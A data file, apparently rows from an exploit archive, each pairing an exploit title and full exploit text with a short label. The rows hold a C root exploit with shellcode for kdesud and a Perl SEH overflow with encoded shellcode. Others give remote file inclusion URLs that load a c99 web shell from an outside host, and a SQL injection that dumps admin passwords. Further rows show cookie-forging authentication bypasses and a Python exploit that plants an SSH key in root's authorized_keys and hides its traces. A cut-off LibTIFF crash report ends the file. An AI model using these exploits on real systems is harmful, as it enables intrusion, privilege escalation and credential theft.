19970,"KDE 1.1/1.1.1/1.1.2/1.2 - kdesud DISPLAY Environment Variable Overflow // source: https://www.securityfocus.com/bid/1274/info  /usr/bin/kdesud has a DISPLAY environment variable overflow which could allow for the execution of arbitrary code.   /*  KDE: /usr/bin/kdesud exploit by noir  *  x86/Linux  *  noir@gsu.linux.org.tr | noir@olympos.org  *  DISPLAY env overflow   *  this script will get you gid = 0 !!    *  tested on Mandrake 7.0 (Air), for other distros play with argv1 for eip    *  greetz: dustdevil, Cronos, moog, still, #olympos irc.sourtimes.org   *        */  #include <stdio.h> #include <string.h>  #define NOP             0x90 #define ALIGN   2 #define RET     0xbffff664  // Mandrake 7.0 (x86)                               int  main(int argc, char *argv[]) {         unsigned char shell[] =         ""\x31\xc0\x89\xc3\x89\xc1\xb0\x47\xcd\x80"" /* setregid(0, 0) */     ""\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b""     ""\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd""     ""\x80\xe8\xdc\xff\xff\xff/bin/sh"";           char buf[400];         int i, a;         long ret = RET;       if(argv[1])         ret = ret - atoi(argv[1]);                           memset(buf, NOP, 400);              for(i = ALIGN  ; i < 160 + ALIGN; i+=4)                 *(long *) &buf[i] = ret;              for( i = 300, a = 0; a < strlen(shell) ; i++, a++ )         buf[i] = shell[a];                  buf[399] = 0x00;         printf(""eip: 0x%x\n"", ret);          setenv(""DISPLAY"", buf, 1);         execl(""/usr/bin/kdesud"", ""kdesud"",  0);  }",DISPLAY Environment Variable Overflow,1
39962,"ATCOM PBX IP01 / IP08 / IP4 / IP2G4A - Authentication Bypass # Title: ATCOM PBX system , auth bypass exploit # Author: i-Hmx # contact : n0p1337@gmail.com # Home : sec4ever.com # Tested on : ATCOM IP01 , IP08 , IP4G and ip2G4A  Details The mentioned system is affected by auth bypass flaw that allow an attacker to get admin access on the vulnerable machine without perior access The security check is really stupid , depend on js affected lines  js/util.js function alertWithoutLogin(){     var username = getCookie(""username"");     //alert(username);     if(!!!username){         alert('Sorry, permission denied. Please login first!');     } }  so actually it just check if username value exist in cookies and if not , redirect to login.html just like that!!!!!!!!!!!!!  exploitation?! just from browser , press f12 , open console type document.cookie=""username=admin"" or from burp intercept proxy and set the cookies as well go to ip/admin/index.html and you are in , simple like that :/  Demo request  GET /admin/index.html HTTP/1.1 Host: 192.168.44.12 User-Agent: Mozilla/1.0 (Windows NT 3.3; WOW32; rv:60.0) Gecko/20010101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: username=admin Connection: close Upgrade-Insecure-Requests: 1  From Eg-R1z with love ./Faris",Authentication Bypass Details,1
28883,Easy Web Portal 2.1.2 - Multiple Remote File Inclusions source: https://www.securityfocus.com/bid/20825/info  Easy Web Portal is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  Version 2.1.2 is vulnerable; other versions may also be affected.  http://www.example.com/i-accueil.php?chemin=http://redhat.by.ru/c99.txt?cmd=id http://www.example.com/i-index.php?chemin=http://redhat.by.ru/c99.txt?cmd=id,Remote File Inclusions,1
26714,"PHPYellowTM 5.33 - 'print_me.php?ckey' SQL Injection source: https://www.securityfocus.com/bid/15700/info   phpYellowTM is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.   Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/print_me.php?ckey=[SQL]",SQL Injection,1
20177,"CGI Script Center Subscribe Me Lite 2.0 - Administrative Password Alteration (2) source: https://www.securityfocus.com/bid/1607/info   Regardless of privilege level, any remote user can modify the administrative password for CGI Script Centers' Subscribe Me Lite. This would grant the user full administrative privileges which includes addition or removal of users from mailing lists.   <html> <FORM ACTION=""http://www.cgiscriptcenter.com/cgi-bin/subprodemo/subscribe.pl"" METHOD=""POST"">     <CENTER><BR>     <TABLE BORDER=""0"" WIDTH=""400"">       <TBODY>       <TR>         <TD>                  <P><B><FONT FACE=""verdana, arial, helvetica""><FONT COLOR=""#FF0000"">Subscribe           Me LITE</FONT> Status: Admin Password Set Vulnerability Exploit</FONT></B></P>         <CENTER><FONT FACE=""verdana, arial, helvetica""><FONTCOLOR=""#FF0000"">n30</FONT></CENTER>         <P><FONT SIZE=""-1"" FACE=""verdana, arial, helvetica"">Please enter the NEW Admin Pass: .</FONT></P>         <CENTER>         <TABLE BORDER=""0"">           <TBODY>           <TR>             <TD ALIGN=""RIGHT""><INPUT TYPE=""PASSWORD"" NAME=""pwd""></TD>             <TD><FONT SIZE=""-2"" FACE=""verdana, arial, helvetica"">password</FONT></TD>           </TR>           <TR>             <TD ALIGN=""RIGHT""><INPUT TYPE=""PASSWORD"" NAME=""pwd2""></TD>             <TD><FONT SIZE=""-2"" FACE=""verdana, arial, helvetica"">confirmation</FONT></TD>           </TR>           <TR>             <TD ALIGN=""CENTER""><BR>             <INPUT TYPE=""SUBMIT"" NAME=""setpwd"" VALUE=""  Set Password  ""></TD>             <TD><BR>             <INPUT TYPE=""RESET"" NAME=""""></TD>           </TR></TBODY>         </TABLE></CENTER></TD>       </TR></TBODY>     </TABLE> <FONTSIZE=""1"" FACE=""verdana, arial, helvetica""><B><BR> To Use Modify Source To Point to subscribe.pl on TARGET Server <BR><BR><a href=""mailto:n30@alldas.de"">mail-me</a></CENTER></FORM> </html>",Administrative Password Alteration,1
14089,"PageDirector CMS - Multiple Vulnerabilities ################################################################################### # Exploit Title : PageDirector CMS Multiple Vulnerabilities # Date : 20 - 6 - 2010 # Author : Tr0y-x # Vendor : www.customerparadigm.com # Version : All Versions # Tested on : Linux # Home : WwW.SeC-WaR.CoM <http://www.sec-war.com/> # Price : 675.00 $ << loooooolz ###################################################################################  -== SQL Injection Vulenrability ==-  PageDirector Script Contains A SQL Injection Vulenrability In (Index.php) http://www.[site].com/[path]/index.php?id=[SQL] [SQL] = UniOn+AlL+SelEct+group_concat(username,0x3e,password)+from+admin--  ###################################################################################  -== Add Admin Vulenrability ==-  PageDirector Script Can Bypass The Login Page Of Admin And Add A New User http://www.[site].com/[path]/siteadmin/adduser.php?mode=Add  ###################################################################################  -== Greetz =-  G3n1ux - PrEdAtOr - xXx - Alnjm33 - xR57 - Ahmadso - Jamba - Dr.silent hill  FireStorm - Mr-Alsaeek - Mr.Viktoor  ###################################################################################",SQL Injection,1
9458,"Xenorate Media Player 2.6.0.0 - '.xpl' Universal Local Buffer (SEH) #!/usr/bin/perl # by hack4love # hack4love@hotmail.com # Xenorate Media Player 2.6.0.0(.xpl)Universal Local Buffer Exploit (SEH) # http://www.softpedia.com/progDownload/Xenorate-Download-71701.html #################################################################### ## USE>>LOAD PLAYLIST>>HACK4LOVE.XPL>>>BOOM CALC #################################################################### # ## easy #### this work sooooooooo good############################ #################################################################### my $bof=""\x41"" x 88; my $nsh=""\xEB\x06\x90\x90""; my $seh=""\x4B\x3F\x01\x11"";##bass.dll my $nop=""\x90"" x 20; my $sec= ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"". ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"". ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"". ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"". ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"". ""\x42\x50\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x48\x4e\x47"". ""\x45\x30\x4a\x47\x41\x50\x4f\x4e\x4b\x48\x4f\x44\x4a\x41\x4b\x48"". ""\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x58\x46\x43\x4b\x38"". ""\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"". ""\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"". ""\x46\x4f\x4b\x43\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"". ""\x4f\x35\x46\x32\x41\x30\x4b\x4e\x48\x56\x4b\x58\x4e\x30\x4b\x44"". ""\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x51\x4b\x48"". ""\x41\x50\x4b\x4e\x49\x58\x4e\x55\x46\x42\x46\x30\x43\x4c\x41\x33"". ""\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x48\x42\x4c\x4a\x37"". ""\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x58\x42\x57\x4e\x51\x4d\x4a"". ""\x4b\x38\x4a\x36\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"". ""\x42\x50\x42\x50\x42\x50\x4b\x48\x4a\x56\x4e\x33\x4f\x35\x41\x53"". ""\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x57"". ""\x42\x35\x4a\x46\x42\x4f\x4c\x58\x46\x50\x4f\x55\x4a\x36\x4a\x59"". ""\x50\x4f\x4c\x38\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x41\x56"". ""\x4e\x56\x43\x46\x42\x30\x5a""; print $bof.$nsh.$seh.$nop.$sec; ################################################################### open(myfile,'>> HACK4LOVE.XPL'); print myfile $bof.$nsh.$seh.$nop.$sec; ###################################################################  # milw0rm.com [2009-08-18]",Universal Local Buffer,1
38836,"ntop-ng 2.0.151021 - Privilege Escalation # Vulnerability title: ntop-ng <= 2.0.151021 - Privilege Escalation # Author: Dolev Farhi # Contact: dolev at flaresec.com # Vulnerable version: 2.0.151021 # Fixed version: 2.2 # Link: ntop.org # Date 27.11.2015 # CVE-2015-8368  # Product Details: ntopng is the next generation version of the original ntop, a network traffic probe that shows the network usage, similar to what the popular top Unix command does. ntopng is based on libpcap and it has been written in a portable way in order to virtually run on every Unix platform, MacOSX and on Windows as well.  # Vulnerability Details: in the latest stable release of ntop-ng it is possible to escalate the privileges of a non-privileged user to the admin account by resetting the password, intercepting the request and replacing the HTTP parameters.  # Vulnerability Proof of concept 1. Login with an unprivileged account 2. Change the account password and intercept the request, modify  the username= and Cookie user= and change to the admin account Example: GET /lua/admin/password_reset.lua?csrf=XXXXXXXXXXXXXXXXXX&username=admin&old_password=12345&new_password=123456&confirm_new_password=123456 HTTP/1.1 Cookie: user=admin; session=XXXXXXXXXXXXXXXXXXXXXXXXX 3. Login with the admin account and the password you defined in step #3.  Voila! you're an administrator.",Privilege Escalation,1
19693,"Python - Untrusted Search Path/Code Execution # Exploit Title: Python untrusted search path/code execution vulnerability # Date: 7.6.12 # Exploit Author: rogueclown # Vendor Homepage: http://www.python.org # Software Link: http://www.python.org/getit/releases/ # Version: python 2.7.2 and python 3.2.1 # Tested on: linux (my test machine was OpenSUSE 12.1) # # This is an expansion on www.exploit-db.com/exploits/19523/ -- a big thanks, # and the lion's share of the credit, to ShadowHatesYou (Shadow@SquatThis.net). # They found the vulnerability; i just found a more generalized application # of it. #  # Basically, i found that it's not just python-wrapper that executes a test.py # script within the current working directory when help('modules') is run -- # python itself does that.  In python 2, it works just as ShadowHatesYou showed # it in his python-wrapper exploit. # # This still works in python 3, but you have to do a bit more to cover your # tracks.  In the working directory, python 3 drops a __pycache__ directory  # with a .pyc file inside it.  Most of the bytecode in there is not human # readable, but it displays the shell command called by the script in  # plaintext, making it pretty obvious that something funny happened.  However, # you can get around this by making sure that your test.py script removes the # __pycache__ directory from the working directory.  # # rogueclown # rogueclown@rogueclown.net # 7.6.12  ############ # PYTHON 2 # ############  adalia@bukkit:~/security/pythonwrapper> ls -hl test.py -rw-r--r-- 1 adalia users 144 Jul  4 15:47 test.py adalia@bukkit:~/security/pythonwrapper> cat test.py #!/usr/bin/python  import os  os.system(""/bin/echo $(echo ssh-rsa rogueclown washere >> /root/.ssh/authorized_keys); chmod 4755 /usr/bin/nmap"") adalia@bukkit:~/security/pythonwrapper> ls -hl /usr/bin/nmap -rwxr-xr-x 1 root root 1.4M Oct 29  2011 /usr/bin/nmap adalia@bukkit:~/security/pythonwrapper> su Password:  bukkit:/home/adalia/security/pythonwrapper # ls /root/.ssh/authorized_keys ls: cannot access /root/.ssh/authorized_keys: No such file or directory bukkit:/home/adalia/security/pythonwrapper # python Python 2.7.2 (default, Aug 19 2011, 20:41:43) [GCC] on linux2 Type ""help"", ""copyright"", ""credits"" or ""license"" for more information. >>> help('modules')  Please wait a moment while I gather a list of all available modules...   /usr/lib64/python2.7/site-packages/gobject/constants.py:24: Warning: g_boxed_type_register_static: assertion `g_type_from_name (name) == 0' failed   import gobject._gobject /usr/lib64/python2.7/site-packages/twisted/words/im/__init__.py:8: UserWarning: twisted.im will be undergoing a rewrite at some point in the future.   warnings.warn(""twisted.im will be undergoing a rewrite at some point in the future."") ** Message: pygobject_register_sinkfunc is deprecated (GstObject) Alacarte            abc                 gtkunixprint        readline BaseHTTPServer      aifc                gzip                repr Bastion             antigravity         hashlib             resource BeautifulSoup       anydbm              heapq               rexec BeautifulSoupTests  argparse            hmac                rfc822 CDROM               array               hotshot             rlcompleter CGIHTTPServer       ast                 hpmudext            robotparser ConfigParser        asynchat            htmlentitydefs      rpm Cookie              asyncore            htmllib             runpy Crypto              atexit              httplib             satsolver DLFCN               atk                 httplib2            scanext DocXMLRPCServer     atom                ieee1284            sched HTMLParser          audiodev            ihooks              scout IN                  base64              imaplib             select MimeWriter          bdb                 imghdr              serial OpenSSL             beaker              imp                 sets PAM                 binascii            importlib           setuptools PyQt4               binhex              imputil             sgmllib Queue               bisect              inspect             sha SimpleHTTPServer    bsddb               io                  shelve SimpleXMLRPCServer  butterfly           itertools           shlex SocketServer        bz2                 json                shutil StringIO            cPickle             keyword             signal TYPES               cProfile            lib2to3             simplejson UserDict            cStringIO           libproxy            sip UserList            cairo               libvboxjxpcom       site UserString          calendar            libxml2             smbc VBoxAuth            cgi                 libxml2mod          smtpd VBoxAuthSimple      cgitb               linecache           smtplib VBoxDD              chunk               linuxaudiodev       sndhdr VBoxDD2             cmath               locale              socket VBoxDDU             cmd                 logging             spwd VBoxDbg             code                louie               sqlite3 VBoxGuestControlSvc codecs              macpath             sre VBoxGuestPropSvc    codeop              macurl2path         sre_compile VBoxHeadless        coherence           mad                 sre_constants VBoxKeyboard        collections         mailbox             sre_parse VBoxNetDHCP         colorsys            mailcap             ssl VBoxOGLhostcrutil   commands            mako                stat VBoxOGLhosterrorspu compileall          markupbase          statvfs VBoxOGLrenderspu    compiler            markupsafe          string VBoxPython          contextlib          marshal             stringold VBoxPython2_7       cookielib           math                stringprep VBoxREM             copy                md5                 strop VBoxRT              copy_reg            mhlib               struct VBoxSDL             crypt               mimetools           subprocess VBoxSharedClipboard csv                 mimetypes           sunau VBoxSharedCrOpenGL  ctypes              mimify              sunaudio VBoxSharedFolders   cups                mmap                symbol VBoxVMM             cupsext             modulefinder        symtable VBoxXPCOM           cupshelpers         multifile           sys VBoxXPCOMC          curl                multiprocessing     sysconfig VirtualBox          datetime            mutagen             syslog Xlib                dbhash              mutex               tabnanny _LWPCookieJar       dbus                mygpoclient         tarfile _MozillaCookieJar   dbus_bindings       netrc               telepathy __builtin__         decimal             new                 telnetlib __future__          difflib             nis                 tempfile _abcoll             dircache            nntplib             termios _ast                dis                 ntpath              textwrap _bisect             distutils           nturl2path          this _bsddb              doctest             numbers             thread _codecs             drv_libxml2         numpy               threading _codecs_cn          dsextras            opcode              time _codecs_hk          dumbdbm             operator            timeit _codecs_iso2022     dummy_thread        optparse            toaiff _codecs_jp          dummy_threading     os                  token _codecs_kr          easy_install        os2emxpath          tokenize _codecs_tw          email               ossaudiodev         trace _collections        encodings           packagekit          traceback _csv                errno               pango               tty _ctypes             exceptions          pangocairo          twisted _ctypes_test        eyeD3               papyon              types _dbus_bindings      fcntl               parser              unicodedata _dbus_glib_bindings feedparser          pcardext            unittest _elementtree        filecmp             pdb                 uno _functools          fileinput           pickle              unohelper _hashlib            fnmatch             pickletools         urlgrabber _heapq              formatter           pipes               urllib _hotshot            fpformat            pkg_resources       urllib2 _io                 fractions           pkgutil             urlparse _json               ftplib              platform            user _locale             functools           plistlib            uu _lsprof             future_builtins     popen2              uuid _md5                gc                  poplib              vboxapi _multibytecodec     gdata               posix               vboxshell _multiprocessing    genericpath         posixfile           volkeys _pyio               getopt              posixpath           warnings _random             getpass             pprint              wave _satsolver          gettext             profile             weakref _sha                gi                  pstats              webbrowser _sha256             gio                 pty                 whichdb _sha512             glib                pwd                 wsgiref _socket             glob                py_compile          xdg _sqlite3            gmenu               pyclbr              xdrlib _sre                gnome_sudoku        pycurl              xml _ssl                gnomekeyring        pydoc               xmllib _strptime           gobject             pydoc_data          xmlrpclib _struct             gpod                pyexpat             xxsubtype _symtable           gpodder             pygst               zeitgeist _testcapi           grp                 pygtk               zipfile _threading_local    gst                 pynotify            zipimport _warnings           gstoption           quopri              zlib _weakref            gtk                 random              zope _weakrefset         gtktrayicon         re                    Enter any module name to get more help.  Or, type ""modules spam"" to search for modules whose descriptions contain the word ""spam"".  >>> exit() bukkit:/home/adalia/security/pythonwrapper # ls -hl /usr/bin/nmap -rwsr-xr-x 1 root root 1.4M Oct 29  2011 /usr/bin/nmap bukkit:/home/adalia/security/pythonwrapper # cat /root/.ssh/authorized_keys ssh-rsa rogueclown washere bukkit:/home/adalia/security/pythonwrapper #    ############ # PYTHON 3 # ############  adalia@bukkit:~/security/pythonwrapper> ls -hl test.py -rw-r--r-- 1 adalia users 169 Jul  4 15:51 test.py adalia@bukkit:~/security/pythonwrapper> cat test.py #!/usr/bin/python  import os  os.system(""/bin/echo $(echo ssh-rsa rogueclown washere >> /root/.ssh/authorized_keys); chmod 4755 /usr/bin/nmap; /bin/rm -rf __pycache__"") adalia@bukkit:~/security/pythonwrapper> ls -hl /usr/bin/nmap -rwxr-xr-x 1 root root 1.4M Oct 29  2011 /usr/bin/nmap adalia@bukkit:~/security/pythonwrapper> su Password:  bukkit:/home/adalia/security/pythonwrapper # ls /root/.ssh/authorized_keys ls: cannot access /root/.ssh/authorized_keys: No such file or directory bukkit:/home/adalia/security/pythonwrapper # python3 Python 3.2.1 (default, Jul 18 2011, 16:24:40) [GCC] on linux2 Type ""help"", ""copyright"", ""credits"" or ""license"" for more information. >>> help('modules')  Please wait a moment while I gather a list of all available modules...   CDROM               binascii            inspect             shelve DLFCN               binhex              io                  shlex IN                  bisect              itertools           shutil TYPES               builtins            json                signal __future__          bz2                 keyword             site _abcoll             cProfile            linecache           smtpd _ast                calendar            locale              smtplib _bisect             cgi                 logging             sndhdr _codecs             cgitb               macpath             socket _codecs_cn          chunk               macurl2path         socketserver _codecs_hk          cmath               mailbox             spwd _codecs_iso2022     cmd                 mailcap             sqlite3 _codecs_jp          code                marshal             sre_compile _codecs_kr          codecs              math                sre_constants _codecs_tw          codeop              mimetypes           sre_parse _collections        collections         mmap                ssl _compat_pickle      colorsys            modulefinder        stat _csv                compileall          multiprocessing     string _ctypes             concurrent          netrc               stringprep _datetime           configparser        nis                 struct _dummy_thread       contextlib          nntplib             subprocess _elementtree        copy                ntpath              sunau _functools          copyreg             nturl2path          symbol _hashlib            crypt               numbers             symtable _heapq              csv                 opcode              sys _io                 ctypes              operator            sysconfig _json               datetime            optparse            syslog _locale             decimal             os                  tabnanny _lsprof             difflib             os2emxpath          tarfile _markupbase         dis                 ossaudiodev         telnetlib _multibytecodec     distutils           parser              tempfile _multiprocessing    doctest             pdb                 termios _pickle             dummy_threading     pickle              textwrap _posixsubprocess    email               pickletools         this _pyio               encodings           pipes               threading _random             errno               pkgutil             time _socket             fcntl               platform            timeit _sqlite3            filecmp             plistlib            token _sre                fileinput           poplib              tokenize _ssl                fnmatch             posix               trace _string             formatter           posixpath           traceback _strptime           fractions           pprint              tty _struct             ftplib              profile             turtle _symtable           functools           pstats              types _thread             gc                  pty                 unicodedata _threading_local    genericpath         pwd                 unittest _warnings           getopt              py_compile          urllib _weakref            getpass             pyclbr              uu _weakrefset         gettext             pydoc               uuid abc                 glob                pydoc_data          warnings aifc                grp                 queue               wave antigravity         gzip                quopri              weakref argparse            hashlib             random              webbrowser array               heapq               re                  wsgiref ast                 hmac                readline            xdrlib asynchat            html                reprlib             xxlimited asyncore            http                resource            xxsubtype atexit              imaplib             rlcompleter         zipfile audioop             imghdr              runpy               zipimport base64              imp                 sched               zlib bdb                 importlib           select                Enter any module name to get more help.  Or, type ""modules spam"" to search for modules whose descriptions contain the word ""spam"".  >>> exit() bukkit:/home/adalia/security/pythonwrapper # ls -hl /usr/bin/nmap -rwsr-xr-x 1 root root 1.4M Oct 29  2011 /usr/bin/nmap bukkit:/home/adalia/security/pythonwrapper # cat /root/.ssh/authorized_keys ssh-rsa rogueclown washere bukkit:/home/adalia/security/pythonwrapper # ls __pycache__ ls: cannot access __pycache__: No such file or directory bukkit:/home/adalia/security/pythonwrapper #",Untrusted Search Path/Code Execution,1
43322,"LibTIFF pal2rgb 4.0.9 - Heap Buffer Overflow Source: http://bugzilla.maptools.org/show_bug.cgi?id=2750  The vulnerability is triggered by ./tools/pal2rgb $FILE /dev/null  The asan debug information is below:  TIFFFetchNormalTag: Warning, IO error during reading of ""XResolution""; tag ignored. TIFFFetchNormalTag: Warning, IO error during reading of ""YResolution""; tag ignored. sample.tiff: JPEG compression support is not configured. TIFFSetField: /dev/null: Unknown pseudo-tag 65537. TIFFSetField: /dev/null: Unknown pseudo-tag 65538. sample.tiff: JPEG compression support is not configured. ================================================================= ==29649==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000009fe1 at pc 0x0000004f3109 bp 0x7fff697434d0 sp 0x7fff697434c8 WRITE of size 1 at 0x611000009fe1 thread T0     #0 0x4f3108  (/home/vagrant/targets/asan/tt/tools/pal2rgb+0x4f3108)     #1 0x7f678dc0cf44  (/lib/x86_64-linux-gnu/libc.so.6+0x21f44)     #2 0x419ba5  (/home/vagrant/targets/asan/tt/tools/pal2rgb+0x419ba5)  0x611000009fe1 is located 0 bytes to the right of 225-byte region [0x611000009f00,0x611000009fe1) allocated by thread T0 here:     #0 0x4c3f08  (/home/vagrant/targets/asan/tt/tools/pal2rgb+0x4c3f08)     #1 0x4f2748  (/home/vagrant/targets/asan/tt/tools/pal2rgb+0x4f2748)     #2 0x7f678dc0cf44  (/lib/x86_64-linux-gnu/libc.so.6+0x21f44)  SUMMARY: AddressSanitizer: heap-buffer-overflow (/home/vagrant/targets/asan/tt/tools/pal2rgb+0x4f3108) Shadow bytes around the buggy address:   0x0c227fff93a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff93b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff93c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff93d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff93e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c227fff93f0: 00 00 00 00 00 00 00 00 00 00 00 00[01]fa fa fa   0x0c227fff9400: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff9410: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff9420: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff9430: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c227fff9440: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa   Heap right redzone:      fb   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack partial redzone:   f4   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==29649==ABORTING  pal2rgb allocates the output buffer(obuf) too small at tools/pal2rgb.c:188. That cause heap overflow and lead to memory corruption in TIFFSetupStrips().  (gdb) r sample.tiff /dev/null The program being debugged has been started already. Start it from the beginning? (y or n) y  Starting program: /home/vagrant/targets/asan/tt/tools/pal2rgb sample.tiff /dev/null TIFFFetchNormalTag: Warning, IO error during reading of ""XResolution""; tag ignored. TIFFFetchNormalTag: Warning, IO error during reading of ""YResolution""; tag ignored. sample.tiff: JPEG compression support is not configured. TIFFSetField: /dev/null: Unknown pseudo-tag 65537. TIFFSetField: /dev/null: Unknown pseudo-tag 65538. sample.tiff: JPEG compression support is not configured. *** Error in `/home/vagrant/targets/asan/tt/tools/pal2rgb': malloc(): memory corruption: 0x0000000000652160 ***  Program received signal SIGABRT, Aborted. 0x00007ffff7741c37 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56 56    ../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory. (gdb) bt #0  0x00007ffff7741c37 in __GI_raise (sig=sig@entry=6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56 #1  0x00007ffff7745028 in __GI_abort () at abort.c:89 #2  0x00007ffff777e2a4 in __libc_message (do_abort=1,     fmt=fmt@entry=0x7ffff7890310 ""*** Error in `%s': %s: 0x%s ***\n"")     at ../sysdeps/posix/libc_fatal.c:175 #3  0x00007ffff778c584 in malloc_printerr (ptr=0x652160,     str=0x7ffff788c4df ""malloc(): memory corruption"", action=<optimized out>) at malloc.c:4998 #4  _int_malloc (av=0x7ffff7acd760 <main_arena>, bytes=24) at malloc.c:3449 #5  0x00007ffff778dae0 in __GI___libc_malloc (bytes=24) at malloc.c:2893 #6  0x00000000004122a5 in TIFFSetupStrips (tif=tif@entry=0x651b80) at tif_write.c:545 #7  0x00000000004124b5 in TIFFWriteCheck (tif=0x651b80, tiles=<optimized out>,     module=0x42de50 <module> ""TIFFWriteScanline"") at tif_write.c:613 #8  0x0000000000412a74 in TIFFWriteScanline (tif=tif@entry=0x651b80, buf=buf@entry=0x652070,     row=row@entry=0, sample=sample@entry=0) at tif_write.c:56 #9  0x0000000000401dbd in main (argc=<optimized out>, argv=<optimized out>) at pal2rgb.c:200  Affected version: 4.0.9 Latest version: 4.0.9  pal2rgb allocate output buffer to convert TIFF format. The output buffer always uses a fixed size(225).  However, when write data to output buffer, imagewidth and imagelength of the input TIFF file are used. it lead to heap overflow.  1) get imagewidth and imagelength from input TIFF  tools/pal2rgb.c:142     TIFFGetField(in, TIFFTAG_IMAGEWIDTH, &imagewidth); tools/pal2rgb.c:143     TIFFGetField(in, TIFFTAG_IMAGELENGTH, &imagelength);  2) allocate output buffer tools/pal2rgb.c:188       obuf = (unsigned char*)_TIFFmalloc(TIFFScanlineSize(out)); // TIFFScanlineSize(out) returns always 225.  3) write data to output buffer tools/pal2rgb.c:191         for (row = 0; row < imagelength; row++) { tools/pal2rgb.c:192             if (!TIFFReadScanline(in, ibuf, row, 0)) tools/pal2rgb.c:193                 goto done; tools/pal2rgb.c:194             pp = obuf; tools/pal2rgb.c:195             for (x = 0; x < imagewidth; x++) { // HEAP OVERFLOW! tools/pal2rgb.c:196                 *pp++ = (unsigned char) rmap[ibuf[x]]; tools/pal2rgb.c:197                 *pp++ = (unsigned char) gmap[ibuf[x]]; tools/pal2rgb.c:198                 *pp++ = (unsigned char) bmap[ibuf[x]]; tools/pal2rgb.c:199             } tools/pal2rgb.c:200             if (!TIFFWriteScanline(out, obuf, row, 0)) // CRASH! tools/pal2rgb.c:201                 goto done; tools/pal2rgb.c:202         }  The process's heap memory was corrupted by COLORMAP/mage Width/Image Length of the TIFF document. The offset of the corresponding values in the poc.tiff file is shown below.  COLORMAP {     R : 0x25~0x224     G : 0x225~0x424     B : 0x425~0x624 }  Image Width : 0x24FE Image Length : 0x250A    Note You need to log in before you can comment on or make changes to this bug.  Description From jungun.baek 2017-11-29 00:50:42 The vulnerability is triggered by ./tools/pal2rgb $FILE /dev/null  The asan debug information is below:  TIFFFetchNormalTag: Warning, IO error during reading of ""XResolution""; tag ignored. TIFFFetchNormalTag: Warning, IO error during reading of ""YResolution""; tag ignored. sample.tiff: JPEG compression support is not configured. TIFFSetField: /dev/null: Unknown pseudo-tag 65537. TIFFSetField: /dev/null: Unknown pseudo-tag 65538. sample.tiff: JPEG compression support is not configured. ================================================================= ==29649==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x611000009fe1 at pc 0x0000004f3109 bp 0x7fff697434d0 sp 0x7fff697434c8 WRITE of size 1 at 0x611000009fe1 thread T0     #0 0x4f3108  (/home/vagrant/targets/asan/tt/tools/pal2rgb+0x4f3108)     #1 0x7f678dc0cf44  (/lib/x86_64-linux-gnu/libc.so.6+0x21f44)     #2 0x419ba5  (/home/vagrant/targets/asan/tt/tools/pal2rgb+0x419ba5)  0x611000009fe1 is located 0 bytes to the right of 225-byte region [0x611000009f00,0x611000009fe1) allocated by thread T0 here:     #0 0x4c3f08  (/home/vagrant/targets/asan/tt/tools/pal2rgb+0x4c3f08)     #1 0x4f2748  (/home/vagrant/targets/asan/tt/tools/pal2rgb+0x4f2748)     #2 0x7f678dc0cf44  